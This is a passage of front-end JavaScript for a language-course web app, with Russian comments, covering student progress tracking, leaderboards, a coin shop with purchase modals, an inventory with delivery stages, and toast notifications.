      const oddDays = [1, 3, 5];
      const evenDays = [2, 4, 6];
      let studyDaysElapsed = 0;
      let tempDate = new Date(courseStartDate);

      while (!((study_days === "odd" && oddDays.includes(tempDate.getDay())) ||
               (study_days === "even" && evenDays.includes(tempDate.getDay())))) {
        tempDate.setDate(tempDate.getDate() + 1);
      }

      const firstStudyDate = new Date(tempDate);
      tempDate = new Date(firstStudyDate);
      while (tempDate <= currentDate) {
        if ((study_days === "odd" && oddDays.includes(tempDate.getDay())) ||
            (study_days === "even" && evenDays.includes(tempDate.getDay()))) {
          studyDaysElapsed++;
        }
        tempDate.setDate(tempDate.getDate() + 1);
      }

      const studyWeeksElapsed = Math.floor((studyDaysElapsed - 1) / 3);
      const dayInWeek = ((studyDaysElapsed - 1) % 3) + 1;
      const unit = `${studyWeeksElapsed + 1}.${dayInWeek}`;
      const weekNumber = studyWeeksElapsed + 1;
      const nextExamDate = getNextExamDate(unit, start_date, study_days);

      currentLevel = level;
      currentUnit = unit;
      activeCurrentUnit = unit;

      updateStrikes();
      generateTodayTasks(currentLevel, currentUnit);

      if (skeletonCard) skeletonCard.style.display = "none";
      if (progressCard) progressCard.style.display = "flex";

      document.getElementById("current-level-value").textContent = level;
      document.getElementById("next-level-label").textContent = `Next: ${getNextLevel(level)}`;
      document.getElementById("current-unit-value").textContent = `Unit ${unit}`;
      document.getElementById("current-week-value").textContent = `Week ${weekNumber}`;
      document.getElementById("completion-value").textContent = `${completionPercentage}%`;
      document.getElementById("coins-value").textContent = coins;
      document.getElementById("points-value").textContent = `${points}`;
      document.getElementById("leaderboard-value").textContent = leaderboardRank;
      document.getElementById("strike-value").textContent = strikeDays > 0 ? `${strikeDays} day${strikeDays > 1 ? 's' : ''}` : 'None';
      document.getElementById("progress-score").textContent = `Total Score: ${parseFloat(progress).toFixed(2)}%`;
      document.getElementById("progress-bar-fill").style.width = `${parseFloat(progress).toFixed(2)}%`;

      const finalExamPercent = ((parseFloat(finalExam) / 30) * 100).toFixed(2);
      document.getElementById("finalExamLabel").textContent = `${finalExam} / 30 (${finalExamPercent}%)`;
      const finalExamBar = document.getElementById("progressFinalExamBar");
      if (finalExamBar) finalExamBar.style.width = `${finalExamPercent}%`;

      const studentTodayInfo = todayResultsData[username];
      let todayAverage = 0;

      if (studentTodayInfo && studentTodayInfo.tasks) {
        const unitPercentages = {};
        Units.forEach(unit => {
          const tasks = studentTodayInfo.tasks.filter(t => t.unit === unit);
          unitPercentages[unit] = tasks.length
            ? tasks.reduce((sum, t) => sum + t.percent, 0) / tasks.length
            : 0;
        });

        todayAverage = Units.reduce((sum, unit) => sum + unitPercentages[unit], 0) / Units.length;
        todayAverage = parseFloat(todayAverage.toFixed(2));
      }

      const todayPercent = ((todayAverage / 60) * 100).toFixed(2);
      document.getElementById("todayLabel").textContent = `${todayAverage.toFixed(2)} / 60 (${todayPercent}%)`;
      const todayBar = document.getElementById("progressTodayBar");
      if (todayBar) todayBar.style.width = `${todayPercent}%`;

      return fetch('/api/get-leaderboard')
        .then(response => {
          if (!response.ok) throw new Error('Failed to fetch leaderboard');
          return response.json();
        })
        .then(leaderboardData => ({ leaderboardData, todayResultsData }));
    })
    .then(({ leaderboardData, todayResultsData }) =>
      fetch(`/api/get-history?username=${username}`)
        .then(r => r.ok ? r.json() : [])
        .then(historyData => ({ leaderboardData, historyData, todayResultsData }))
    )
    .then(({ leaderboardData, historyData, todayResultsData }) => {
      updateLeaderboard("progress", leaderboardData, historyData);

      toggleProgress.addEventListener('click', () => {
        if (currentView !== "progress") {
          currentView = "progress";
          toggleProgress.classList.add('active');
          toggleToday.classList.remove('active');
          loadingEl.style.display = "flex";
          fixedTableBody.innerHTML = `<tr><td colspan="3" class="loading-spinner"><div class="lds-spinner">${'<div></div>'.repeat(12)}</div></td></tr>`;
          unitsTableBody.innerHTML = '';
          fetch('/api/get-leaderboard')
            .then(r => r.ok ? r.json() : Promise.reject('Leaderboard error'))
            .then(newLeaderboard => updateLeaderboard("progress", newLeaderboard, historyData))
            .catch(e => {
              errorMessageEl.textContent = "Failed to load leaderboard";
              errorMessageEl.style.display = "block";
              loadingEl.style.display = "none";
              console.error(e);
            });
        }
      });
	  

      toggleToday.addEventListener('click', () => {
        if (currentView !== "today") {
          currentView = "today";
          toggleToday.classList.add('active');
          toggleProgress.classList.remove('active');
          loadingEl.style.display = "flex";
          fixedTableBody.innerHTML = `<tr><td colspan="3" class="loading-spinner"><div class="lds-spinner">${'<div></div>'.repeat(12)}</div></td></tr>`;
          unitsTableBody.innerHTML = `<tr><td colspan="${Units.indexOf(activeCurrentUnit) + 1}" class="loading-spinner"></td></tr>`;
          fetch(`/api/get-results/today?level=${currentLevel}`)
            .then(r => r.ok ? r.json() : Promise.reject('Today error'))
            .then(newToday => updateLeaderboard("today", newToday, historyData))
            .catch(e => {
              errorMessageEl.textContent = "Failed to load today's leaderboard";
              errorMessageEl.style.display = "block";
              loadingEl.style.display = "none";
              console.error(e);
            });
        }
      });
    })
    .catch(err => {
      console.warn("⚠️ Student not active:", err.message);
      if (skeletonCard) skeletonCard.style.display = "none";
      if (progressCard) progressCard.style.display = "none";
      progressContainer.style.display = "none";
      loadingEl.style.display = "none";
      errorMessageEl.innerHTML = `
        <div class="glass-error">
          <div class="icon"><i class="fas fa-user-slash"></i></div>
          <strong>You are not an active student</strong><br>
          <span>Join the course or <a href="https://t.me/SAV571420" target="_blank">Support Center</a> to activate your account.</span>
        </div>
      `;
      errorMessageEl.style.display = "block";
    })
    .finally(() => {
      loadingEl.style.display = "none";
    });
}

// Stub for generating tasks — replace with actual implementation
function generateTodayTasks(level, unit) {
  console.log(`📘 Generating tasks for Level: ${level}, Unit: ${unit}`);
  // Example: fetch(`/api/get-tasks?level=${level}&unit=${unit}`)...
}
	
function fetchLeaderboardRank(username) {
    const leaderboardValue = document.getElementById("leaderboard-value");
    const progressCard = document.getElementById("progress-card");

    if (!leaderboardValue || !progressCard) return;

    const mainPage = document.getElementById("main");
    if (!mainPage.classList.contains("active")) return;

    const updateLeaderboardValue = () => {
        const cachedRank = sessionStorage.getItem('userRank');
        if (cachedRank) {
            leaderboardValue.innerText = `#${cachedRank}`;
            return true;
        }

        fetch('/api/leaderboard')
            .then(response => {
                if (!response.ok) throw new Error();
                return response.json();
            })
            .then(data => {
                if (!username) {
                    leaderboardValue.innerText = `#?`;
                    return;
                }

                let allPlayers = [...data.top_3, ...data.others];
                let userRank = allPlayers.findIndex(player => player.name.trim().toLowerCase() === username.toLowerCase()) + 1;

                if (userRank > 0) {
                    leaderboardValue.innerText = `#${userRank}`;
                    sessionStorage.setItem('userRank', userRank);
                } else {
                    leaderboardValue.innerText = `#?`;
                    sessionStorage.setItem('userRank', '?');
                }
            })
            .catch(() => {
                leaderboardValue.innerText = `#?`;
                sessionStorage.setItem('userRank', '?');
            });

        return false;
    };

    if (progressCard.style.display !== "none") {
        updateLeaderboardValue();
    } else {
        const observer = new MutationObserver((mutations) => {
            mutations.forEach(mutation => {
                if (mutation.attributeName === "style" && progressCard.style.display !== "none") {
                    updateLeaderboardValue();
                    observer.disconnect();
                }
            });
        });
        observer.observe(progressCard, { attributes: true });
    }
}
    // Initial load
    showPage('main');
	
document
  .querySelector('.progress-item.leaderboard-trigger')
  .addEventListener('click', () => {
    currentChatId = 'leaderboard';
    showPage('leaderboard');
  });

async function updateStrikes() {
  try {
    // 1) Получаем средний процент + submitted_count и total_tasks, передаём username
    const avgUrl = `/api/get-results/average`
      + `?level=${encodeURIComponent(currentLevel)}`
      + `&unit=${encodeURIComponent(currentUnit)}`
      + `&username=${encodeURIComponent(currentUser)}`;
    const avgRes = await fetch(avgUrl);
    if (!avgRes.ok) throw new Error(avgRes.statusText);
    const avgData = await avgRes.json();

    const stats = avgData[username] || {
      average_percent: 0,
      submitted_count: 0,
      total_tasks: 0
    };
    const unitPercent    = stats.average_percent;
    const submittedCount = stats.submitted_count;
    const totalTasks     = stats.total_tasks;

    // 2) Отправляем на сервер данные для начисления или сброса штрихов
    const strikeRes = await fetch('/api/check-strike', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username:        username,
        currentUnit:     currentUnit,
        unitPercent:     unitPercent,
        submittedCount:  submittedCount,
        totalTasks:      totalTasks
      })
    });
    if (!strikeRes.ok) throw new Error(strikeRes.statusText);
    const { strikes } = await strikeRes.json();

    // 3) Обновляем UI
    const text = strikes > 0
      ? `${strikes} Strike${strikes > 1 ? 's' : ''}`
      : '0 Strike';
    document.getElementById("strike-value").textContent = text;

  } catch (e) {
    console.error('Failed to update strikes:', e);
  }
}


async function fetchAvatar(name) {
    // Попытка загрузить изображение, если не найдено — показать первую букву
    try {
        const response = await fetch(`/avatars/${encodeURIComponent(name)}.png`);
        if (response.ok) {
            return `<img src="/avatars/${name}.png" alt="${name}'s avatar" />`;
        } else {
            throw new Error('Avatar not found');
        }
    } catch {
        const firstLetter = name.charAt(0).toUpperCase();
        return `<div class="avatar-placeholder">${firstLetter}</div>`;
    }
}

// Обновить таблицу лидеров
async function updateLeaderboardUI(mode = 'points') {
  const leaderboardContainer = document.getElementById('leaderboard-container');
  if (!leaderboardContainer) return;

  // Скелетон загрузки
  leaderboardContainer.innerHTML = `
    <div class="leaderboard-loading">
      <div class="skeleton skeleton-title"></div>

      <div class="skeleton-top-3">
        <div class="skeleton-top-player">
          <div class="skeleton skeleton-avatar-top"></div>
          <div class="skeleton skeleton-line"></div>
          <div class="skeleton skeleton-line" style="width: 40px;"></div>
        </div>
        <div class="skeleton-top-player">
          <div class="skeleton skeleton-avatar-top"></div>
          <div class="skeleton skeleton-line"></div>
          <div class="skeleton skeleton-line" style="width: 40px;"></div>
        </div>
        <div class="skeleton-top-player">
          <div class="skeleton skeleton-avatar-top"></div>
          <div class="skeleton skeleton-line"></div>
          <div class="skeleton skeleton-line" style="width: 40px;"></div>
        </div>
      </div>

      <div class="skeleton skeleton-list"></div>
      <div class="skeleton skeleton-list"></div>
      <div class="skeleton skeleton-list"></div>
    </div>
  `;

  const endpoint = mode === 'strikes'
    ? '/api/leaderboard-strikes'
    : '/api/leaderboard';

const iconHtml = mode === 'strikes'
  ? '<i class="fas fa-fire" style="color:#ff4d4d;"></i> Strikes'
  : '<i class="fas fa-star"></i>';


  try {
    const res = await fetch(endpoint);
    if (!res.ok) throw new Error(res.status);
    const data = await res.json();

    const allPlayers = [...data.top_3, ...data.others];
    const sorted = allPlayers.sort((a, b) =>
      mode === 'strikes' ? b.strikes - a.strikes : b.coins - a.coins
    );

    const top3 = sorted.slice(0, 3);
    const others = sorted.slice(3);

    let html = `
      <div class="leaderboard">
        <button class="back-button" onclick="history.back()">
          <i class="fas fa-arrow-left"></i> Back
        </button>
        <h2>Leaderboard (${mode === 'strikes' ? 'Strikes' : 'Points'})</h2>

        <div class="leaderboard-tabs">
          <button class="tab-button ${mode === 'points' ? 'active' : ''}" onclick="updateLeaderboardUI('points')">
            <i class="fas fa-star"></i> Points
          </button>
<button class="tab-button ${mode === 'strikes' ? 'active fire-tab' : ''}" onclick="updateLeaderboardUI('strikes')">
  <i class="fas fa-fire"></i> Strikes
</button>

        </div>

        <div class="top-3">
    `;

    for (let i = 0; i < top3.length; i++) {
      const player = top3[i];
      const avatar = await fetchAvatar(player.name);
      const rank = i + 1;
      const suffix = getRankSuffix(rank);
      const value = mode === 'strikes' ? player.strikes : player.coins;

      html += `
        <div class="top-player">
          <div class="leaderboard-avatar">${avatar}</div>
          <div class="rank-number">${rank}${suffix}</div>
          <p>${player.name}</p>
          <p style="opacity:0.8; font-size:0.9em;">
            ${value} ${iconHtml}
          </p>
        </div>
      `;
    }

    html += `</div><ul class="leaderboard-list">`;

    const colors = ['#ffa500', '#ff8c00', '#f39c12', '#e74c3c', '#c0392b'];
    for (let i = 0; i < others.length; i++) {
      const player = others[i];
      const avatar = await fetchAvatar(player.name);
      const rank = i + 4;
      const suffix = getRankSuffix(rank);
      const color = colors[i] || '#555';
      const value = mode === 'strikes' ? player.strikes : player.coins;

      html += `
        <li class="leaderboard-item">
          <div class="leaderboard-avatar">${avatar}</div>
          <span class="leaderboard-name">${player.name}</span>
          <span class="rank-badge" style="background:${color}">${rank}${suffix}</span>
          <span class="leaderboard-rank">
            ${value} ${iconHtml}
          </span>
        </li>
      `;
    }

    html += `</ul></div>`;
    leaderboardContainer.innerHTML = html;

  } catch (err) {
    console.error('Error loading leaderboard:', err);
    leaderboardContainer.innerHTML =
      '<p>Error loading leaderboard. Please try again later.</p>';
  }
}




// Helper function (assuming it exists)
function getRankSuffix(rank) {
    const special = rank % 100;
    if (special >= 11 && special <= 13) return 'th';

    switch (rank % 10) {
        case 1: return 'st';
        case 2: return 'nd';
        case 3: return 'rd';
        default: return 'th';
    }
}


// Helper function (assuming it exists)
const avatarCache = new Map(); // name -> { html, timestamp }

const CACHE_TTL = 30 * 60 * 1000; // 10 минут

async function fetchAvatar(name) {
    const safeName = name.trim();
    const fallback = `<div class="avatar-placeholder">${safeName.charAt(0).toUpperCase()}</div>`;
    const now = Date.now();

    const cached = avatarCache.get(safeName);
    if (cached && now - cached.timestamp < CACHE_TTL) {
        return cached.html;
    }

    try {
        const response = await fetch(`/get_avatar/${encodeURIComponent(safeName)}`);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);

        const data = await response.json();
        const html = data.avatar_url
            ? `<img src="${data.avatar_url}" alt="${safeName}" class="avatar">`
            : fallback;

        avatarCache.set(safeName, { html, timestamp: now });
        return html;

    } catch (error) {
        console.warn(`Avatar not found for "${safeName}":`, error);
        avatarCache.set(safeName, { html: fallback, timestamp: now });
        return fallback;
    }
}




// Привязываем кнопку “Back” при инициализации приложения
const backBtnLeaderboaord = document.getElementById('leaderboard-back');
if (backBtnLeaderboaord) {
  backBtnLeaderboaord.addEventListener('click', () => {
    showPage('main');      // или другая страница, куда нужно вернуться
  });
}

async function openShop(username) {
  if (!username) return;

  let currentFilter = 'ALL';

  function updateCoinsValue() {
    fetch(`/api/get_user_coins/${username}`)
      .then(res => res.json())
      .then(data => {
        const el = document.getElementById('coins-value');
        el.textContent = (data && typeof data.coins === 'number') ? data.coins : '--';
      })
      .catch(() => {
        document.getElementById('coins-value').textContent = '--';
      });
  }

async function generateFilterButtons() {
  // Получаем данные
  const res = await fetch('/api/items');
  const items = await res.json();

  // Список типов (с 'ALL' в начале)
  const types = Array.from(new Set(items.map(i => i.type)));
  types.unshift('ALL');

  // Ищем контейнер по id 'shop-filters', если нет — создаём и вставляем перед products-grid
  let container = document.getElementById('shop-filters');
  const productsGrid = document.getElementById('products-grid');

  if (!container) {
    container = document.createElement('div');
    container.id = 'shop-filters';
    // Можно поменять место вставки, если нужно — сейчас перед сеткой товаров
    if (productsGrid && productsGrid.parentNode) {
      productsGrid.parentNode.insertBefore(container, productsGrid);
    } else {
      document.body.insertAdjacentElement('afterbegin', container);
    }
  }

  // Очистить контейнер и установить класс для стилей
  container.innerHTML = '';
  container.classList.remove('filters-grid', 'filters-scroll');
  // Добавляем оба класса — CSS через media queries переключит поведение
  container.classList.add('filters-grid', 'filters-scroll');

  // Генерируем кнопки
  types.forEach(type => {
    const btn = document.createElement('button');
    btn.type = 'button';
    btn.className = 'filter-btn';
    btn.textContent = type;
    btn.setAttribute('data-type', type);

    if (typeof currentFilter !== 'undefined' && type === currentFilter) {
      btn.classList.add('active');
    }

    btn.addEventListener('click', () => {
      // Обновляем currentFilter и визуально выделяем кнопку
      currentFilter = type;
      const allBtns = container.querySelectorAll('button.filter-btn');
      allBtns.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');

      // Перегенерируем продукты
      // Не await — пусть выполняется асинхронно, но можно добавить await если нужно последовательное поведение
      generateProducts();
    });

    // Доступность: Enter/Space активируют кнопку
    btn.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        btn.click();
      }
    });

    container.appendChild(btn);
  });

  // Если кнопок много на мобильных — можно автоматически прокинуть фокус к активной кнопке
  // (необязательно, но удобно)
  requestAnimationFrame(() => {
    const active = container.querySelector('button.filter-btn.active');
    if (active && container.scrollWidth > container.clientWidth) {
      // плавный центринг активной кнопки (по возможности)
      const offset = active.offsetLeft - (container.clientWidth / 2) + (active.clientWidth / 2);
      container.scrollTo({ left: offset, behavior: 'smooth' });
    }
  });
}


async function generateProducts() {
  const grid = document.getElementById('products-grid');
  grid.innerHTML = '';

  // Показываем 6 skeleton карточек
  for (let i = 0; i < 6; i++) {
    const skeleton = document.createElement('div');
    skeleton.className = 'product-card skeleton';
    skeleton.innerHTML = `
      <div class="skeleton-img"></div>
      <div class="skeleton-line"></div>
      <div class="skeleton-line" style="width: 50%;"></div>
      <div class="skeleton-btn"></div>
    `;
    grid.appendChild(skeleton);
  }

  try {
    const res = await fetch('/api/items');
    const items = await res.json();
    grid.innerHTML = '';

    const filteredItems = currentFilter === 'ALL' ? items : items.filter(item => item.type === currentFilter);

    filteredItems.forEach(item => {
      const card = document.createElement('div');
      card.className = 'product-card';

      const isOutOfStock = item.items_left === 0;
      if (isOutOfStock) card.classList.add('disabled');
	  
	    if (item.image.endsWith('.gif')) {
    card.classList.add('gif-exclusive');
  }

      card.innerHTML = `
        <div class="card-content">
          <img src="${item.image}" alt="${item.name}" class="${item.image.endsWith('.gif') ? 'gif-item' : ''}">
          <h3>${item.name}</h3>
          <p>${isOutOfStock ? 'Out of stock' : `Items left: ${item.items_left}`}</p>
          <button class="buy-btn" ${isOutOfStock ? 'disabled' : ''}>
            ${isOutOfStock ? 'Unavailable' : `Buy ${item.cost} coins`}
          </button>
        </div>
      `;

      if (!isOutOfStock) {
// === 1. Генерация модального окна при загрузке ===
const modalHTML = `
  <div id="checkAnswerModal" class="custom-modal" style="display: none;">
    <div class="custom-modal-content">
      <div class="icon-wrapper">
        <i class="fas fa-wallet custom-modal-icon"></i>
      </div>
      <p class="modal-main-text">Do you want to proceed?</p>
      <p class="modal-sub-text">
        Price: <span class="payment-amount">0</span> coins
      </p>
      <p class="modal-sub-text">
        Commission fee: <span class="payment-commission">0</span> coins
      </p>
      <p class="modal-sub-text total-line">
        Total: <span class="payment-total">0</span> coins
      </p>
      <div class="custom-modal-actions">
        <button id="cancelCheckAnswer" class="custom-modal-btn custom-cancel">Cancel</button>
        <button id="approveCheckAnswer" class="custom-modal-btn custom-approve">Approve</button>
      </div>
    </div>
  </div>
`;
document.body.insertAdjacentHTML('beforeend', modalHTML);

// === 2. Глобальная переменная для текущей покупки ===
let currentPurchaseData = null;

// === 3. Обработчик покупки с динамической модалкой ===
card.querySelector('.buy-btn').addEventListener('click', () => {
  const commissionRate = 0.10;
  const commission = Math.ceil(item.cost * commissionRate);
  const totalCost = item.cost + commission;

  // Сохраняем покупку
  currentPurchaseData = { item, commission, totalCost };

  // Обновляем контент в модалке
  document.querySelector('#checkAnswerModal .modal-main-text').textContent =
    `Do you really want to buy "${item.name}" for ${totalCost} coins?`;

  document.querySelector('#checkAnswerModal .payment-amount').textContent = item.cost;
  document.querySelector('#checkAnswerModal .payment-commission').textContent = commission;
  document.querySelector('#checkAnswerModal .payment-total').textContent = totalCost;

  // Показываем модалку
  document.getElementById('checkAnswerModal').style.display = 'block';
});

// === 4. Кнопка Cancel ===
document.addEventListener('click', (e) => {
  if (e.target.id === 'cancelCheckAnswer') {
    document.getElementById('checkAnswerModal').style.display = 'none';
    currentPurchaseData = null;
  }
});

// === 5. Кнопка Approve ===
document.addEventListener('click', async (e) => {
  if (e.target.id !== 'approveCheckAnswer' || !currentPurchaseData) return;

  const { item, totalCost } = currentPurchaseData;

  const resp = await fetch('/api/purchase', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, id: item.id, amount: totalCost })
  });

  const result = await resp.json();

  document.getElementById('checkAnswerModal').style.display = 'none';
  currentPurchaseData = null;

  if (result.success) {
    showToastNotification(`Purchased ${item.name} for ${totalCost} coins`, 'success');
	showModalStatus(`Purchased "${item.name}" for ${totalCost} coins`);
    updateCoinsValue();
    generateProducts();
  } else {
    showToastNotification(result.message || 'Purchase failed', 'error');
	showModalStatus(result.message, "failed");
  }
});


      }

      grid.appendChild(card);
    });
  } catch (e) {
    console.error('Error generating products:', e);
    showToastNotification('Error loading products. Please try again.', 'warning');
    grid.innerHTML = ''; // Очистить скелетоны при ошибке
  }
}


  // Запуск при открытии магазина
  updateCoinsValue();
  await generateFilterButtons();
  await generateProducts();
}


async function initializeInventory(username) {
  if (!username) return;

  async function fetchInventory(username) {
    const response = await fetch(`/api/inventory/${username}`);
    return response.json();
  }

  async function fetchItemStatus(itemId) {
    const response = await fetch(`/api/item-status/${itemId}?username=${username}`);
    return response.json();
  }

function createItemElement(item) {
  const div = document.createElement('div');
  div.className = 'item';
  div.dataset.id = item.id;
  div.innerHTML = `
    <span class="name">${item.name}</span> - 
    <span class="cost">${item.cost} Coins</span>
    <span class="timestamp">${item.time ? new Date(item.time).toLocaleString() : ''}</span>
    <div class="progress-bar">
      <div class="stage"><div class="stage-icon"><i class="fas fa-box"></i></div><span>Product in packaging</span></div>
      <div class="stage"><div class="stage-icon"><i class="fas fa-truck"></i></div><span>Shipped</span></div>
      <div class="stage"><div class="stage-icon"><i class="fas fa-shipping-fast"></i></div><span>In transit</span></div>
      <div class="stage"><div class="stage-icon"><i class="fas fa-home"></i></div><span>Delivered</span></div>
    </div>
    <div class="item-actions"></div>
  `;
  return div;
}


function updateItemStatus(itemElement, statusObj, item) {
  const currentStatus = statusObj.status;
  const progressBar = itemElement.querySelector('.progress-bar');
  const stages = progressBar.querySelectorAll('.stage');

  const statusOrder = ['Product in packaging', 'Shipped', 'In transit', 'Delivered'];

  stages.forEach((stage) => {
    const stageName = stage.querySelector('span')?.textContent?.trim();
    const icon = stage.querySelector('.stage-icon i');

    if (!stageName || !icon) return;

    // Определяем состояние этапа
    const isCurrent = stageName === currentStatus;
    const isCompleted = !isCurrent &&
      statusOrder.indexOf(stageName) < statusOrder.indexOf(currentStatus);

    // Обновляем классы
    stage.classList.toggle('active', isCurrent);
    stage.classList.toggle('completed', isCompleted);

    // Обновляем иконку
    icon.className = isCompleted
      ? 'fas fa-check'
      : isCurrent
        ? getIconClass(stageName)
        : 'fas fa-circle';

    // Добавляем подсказку
    stage.title = isCompleted
      ? 'Completed'
      : isCurrent
        ? 'Current stage'
        : 'Waiting...';
  });

  // Очистка и установка кнопки "View"
  const actionsDiv = itemElement.querySelector('.item-actions');
  actionsDiv.innerHTML = '';

  const type = (item.type || '').toLowerCase();
  const canView = ['photo', 'video','zapal'].includes(type) && currentStatus === 'Delivered' && statusObj.link;

  if (canView) {
    const viewBtn = document.createElement('button');
    viewBtn.innerHTML = `<i class="fas fa-eye"></i> View`;
    viewBtn.className = 'view-btn';
    viewBtn.onclick = () => {
      window.open(statusObj.link, '_blank');
    };
    actionsDiv.appendChild(viewBtn);
  }
}





  function getIconClass(stageName) {
    switch (stageName) {
      case 'Product in packaging': return 'fas fa-box';
      case 'Shipped': return 'fas fa-truck';
      case 'In transit': return 'fas fa-shipping-fast';
      case 'Delivered': return 'fas fa-check-circle';
      default: return 'fas fa-box';
    }
  }

  async function loadInventory() {
    const itemsSection = document.getElementById('items-section');
    if (!itemsSection) {
      console.error('Element #items-section not found.');
      return;
    }

    const inventory = await fetchInventory(username);
    itemsSection.innerHTML = '';

    for (const item of inventory) {
      const itemElement = createItemElement(item);
      itemsSection.appendChild(itemElement);
      try {
        const status = await fetchItemStatus(item.id);
        updateItemStatus(itemElement, status, item);
      } catch (e) {
        updateItemStatus(itemElement, { status: 'Error' }, item);
        console.error(`Failed to load status for item ${item.id}`, e);
      }
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', loadInventory);
  } else {
    loadInventory();
  }
}


function showToastNotification(message, type = 'success', duration = 5000) {
  const icons = {
    success: 'fa-check',
    error:   'fa-exclamation-triangle',
    warning: 'fa-exclamation-circle',
    info:    'fa-info-circle'
  };

  // Создаём контейнер, если его нет
  let container = document.getElementById('toast-container');
  if (!container) {
    container = document.createElement('div');
    container.id = 'toast-container';
    document.body.appendChild(container);
  }

  const toast = document.createElement('div');
  toast.className = `toast ${type}`;
  // --hide-delay используется в CSS для задержки старта анимации выхода
  toast.style.setProperty('--hide-delay', `${(duration / 1000).toFixed(2)}s`);
  // По желанию можно задать явные длительности/функции сглаживания
  toast.style.setProperty('--toast-enter-duration', '0.45s');
  toast.style.setProperty('--toast-exit-duration', '0.4s');
  toast.style.setProperty('--toast-easing-in', 'cubic-bezier(.2,.9,.3,1)');
  toast.style.setProperty('--toast-easing-out', 'ease-in');

  // Ошибочный звук (если error)
  if (type === 'error') {
    const audio = new Audio('static/music/error.wav');
    audio.play().catch(err => {
      console.warn('Failed to play error sound:', err);
    });
  }

  const icon = document.createElement('div');
  icon.className = 'toast-icon';
  icon.innerHTML = `<i class="fas ${icons[type] || icons.info}"></i>`;

  const msg = document.createElement('div');
  msg.className = 'toast-message';
  msg.innerHTML = message;

  const closeBtn = document.createElement('div');
  closeBtn.className = 'toast-close';
  closeBtn.innerHTML = '&times;';

  toast.append(icon, msg, closeBtn);
  container.appendChild(toast);

  // Активируем вход (плавный enter): добавляем класс в следующий кадр
  requestAnimationFrame(() => toast.classList.add('active'));

  // --- УДАЛЕНИЕ НАДЁЖНОЕ: по окончанию анимации toastExit ---
  // fallback таймер (на случай, если animationend не сработает)
  const fallbackTimeout = setTimeout(() => {
    // Если animationend не сработал — удалим принудительно
    if (document.body.contains(toast)) toast.remove();
  }, duration + 2000);

  function onAnimationEnd(e) {
    // ждём конкретно конца анимации toastExit
    if (e.animationName === 'toastExit') {
      clearTimeout(fallbackTimeout);
      toast.remove();
      toast.removeEventListener('animationend', onAnimationEnd);
    }
  }
  toast.addEventListener('animationend', onAnimationEnd);

  // Функция запуска немедленного выхода (используется при клике крестика)
  function triggerExitNow() {
    // Убираем active (если у вас логика от него зависит) — не обязательно, но безопасно:
    toast.classList.remove('active');
    // Запускаем exit анимацию немедленно, установив задержку в 0
    toast.style.setProperty('--hide-delay', '0s');
    // Если по каким-то причинам animationend не произойдёт, fallback удалит элемент позже
  }

  // Кнопка закрытия — не удаляем прямо, а инициируем exit для анимации
  closeBtn.onclick = () => {
    triggerExitNow();
  };

  // Также можно закрывать по клику на весь тост (необязательно):
  // toast.onclick = () => triggerExitNow();

  // Возврат объекта/элемента на случай внешнего управления (опционально)
  return {
    toastElement: toast,
    close: triggerExitNow
  };
}



function updateDays() {
  const daysContainer = document.getElementById('days');
  daysContainer.innerHTML = '';

  const allUnits = generateAllUnits(); // ['1.1', ..., '12.3']
  console.log('[Units] 🔢 Все юниты:', allUnits);

  const currentIndex = allUnits.indexOf(currentUnit);
  if (currentIndex === -1) {
    console.warn('[Units] ❌ currentUnit не найден:', currentUnit);
    return;
  }

  // Получаем текущую главу (например, '1' из '1.2')
  const currentChapter = currentUnit.split('.')[0];

  // Фильтруем юниты только из текущей главы
  const visibleUnits = allUnits.filter(unit => unit.startsWith(`${currentChapter}.`));
  const availableUnits = getAvailableUnits();

  console.log('[Units] 👁️ Видимые юниты:', visibleUnits);
  console.log('[Units] ✅ Доступные юниты:', availableUnits);
  console.log('[Units] 📌 Текущий юнит:', currentUnit);

  visibleUnits.forEach(unit => {
    const span = document.createElement('span');
    const isActive = unit === currentUnit;
    const isUnlocked = availableUnits.includes(unit);

    span.className = 'day' + (isActive ? ' active' : '') + (isUnlocked ? '' : ' locked');
    span.textContent = `Unit ${unit}`;

    console.log(`[Units] ➕ Unit: ${unit}, active: ${isActive}, unlocked: ${isUnlocked}`);

    if (isUnlocked) {
      span.addEventListener('click', () => {
        console.log(`[Units] 🖱️ Клик по юниту: ${unit}`);
        currentUnit = unit;
        localStorage.setItem('currentUnit', unit);
        updateDays();           // пересоздаём список юнитов с новой главой
        renderTasksSection();   // перерисовываем задания
      });
    }

    daysContainer.appendChild(span);
  });

  // Показываем календарь при обновлении
  daysContainer.classList.add('visible');
}

function toggleCalendar() {
  const picker = document.getElementById('unit-picker');
  picker.classList.toggle('visible');

  if (picker.classList.contains('visible')) {
    renderUnitPicker();
    hideNavigation(); // 👈 скрываем nav
  } else {
    showNavigation(); // 👈 показываем nav
  }
}


function renderUnitPicker() {
  const picker = document.getElementById('unit-picker');
  picker.innerHTML = '<h3>Select a Unit</h3>';

  const grid = document.createElement('div');
  grid.className = 'unit-grid';

  const allUnits = generateAllUnits();
  const availableUnits = getAvailableUnits();

  const currentIndex = allUnits.indexOf(currentUnit);
  const currentChapter = currentUnit.split('.')[0];
  const chapters = Array.from({ length: 12 }, (_, i) => (i + 1).toString());

  chapters.forEach(chapter => {
    const box = document.createElement('div');
    box.className = 'unit-box';
    box.textContent = `Unit ${chapter}`;

    const chapterUnits = allUnits.filter(u => u.startsWith(chapter + '.'));
    const isUnlocked = availableUnits.some(u => u.startsWith(chapter + '.'));

    const chapterStartIndex = allUnits.indexOf(chapterUnits[0]);
    const chapterEndIndex = allUnits.indexOf(chapterUnits[chapterUnits.length - 1]);

    if (currentIndex >= chapterStartIndex && currentIndex <= chapterEndIndex) {
      box.classList.add('active'); // текущий unit находится в этой главе
    } else if (isUnlocked && currentIndex > chapterEndIndex) {
      box.classList.add('completed'); // завершённая глава
    } else if (!isUnlocked) {
      box.classList.add('locked'); // заблокировано
    }

    // Нажатие по юниту
box.addEventListener('click', () => {
  currentUnit = chapter + '.1';
  localStorage.setItem('currentUnit', currentUnit);
  updateDays();
  renderTasksSection();
  renderUnitPicker();

  // 👇 Закрытие всплывающего меню
  document.getElementById('unit-picker').classList.remove('visible');
  showNavigation();
});


    grid.appendChild(box);
  });

  picker.appendChild(grid);
}



